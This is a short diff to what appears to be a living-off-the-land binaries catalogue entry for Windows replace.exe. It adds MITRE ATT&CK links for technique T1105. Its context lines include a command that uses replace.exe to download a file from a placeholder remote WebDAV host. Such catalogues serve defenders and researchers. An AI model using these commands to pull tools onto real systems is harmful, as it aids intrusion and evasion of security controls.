@@ -10,6 +10,7 @@ Commands:
     Category: Copy
     Privileges: User
     MitreID: T1105
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
     Description: Download/Copy bar.exe to outdir
@@ -17,6 +18,7 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1105
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\replace.exe
